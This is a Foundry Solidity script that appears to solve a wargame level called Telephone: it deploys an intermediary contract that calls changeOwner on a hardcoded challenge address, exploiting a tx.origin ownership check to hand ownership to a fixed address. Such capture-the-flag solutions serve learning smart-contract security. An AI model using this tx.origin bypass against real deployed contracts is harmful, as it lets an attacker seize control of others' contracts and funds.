// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "src/4Telephone.sol";

contract HackTelephone {
    Telephone public telephone;

    constructor(address _telephoneAddres) {
        telephone = Telephone(_telephoneAddres);
    }

    function attack() public {
        telephone.changeOwner(0x7b32DF263625bFCC9EdF743A382b81c2e1A567Ec);
    }
}

contract TelephoneAttack is Script {
    address constant CHALLENGE = 0x8d999ac966aEf46610DfcCc7077F90fD0526238D;
    HackTelephone public hackTelephone;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        hackTelephone = new HackTelephone(CHALLENGE);
        console.log("HackFlip deployed at:", address(hackTelephone));
        hackTelephone.attack();
        vm.stopBroadcast();
    }
}
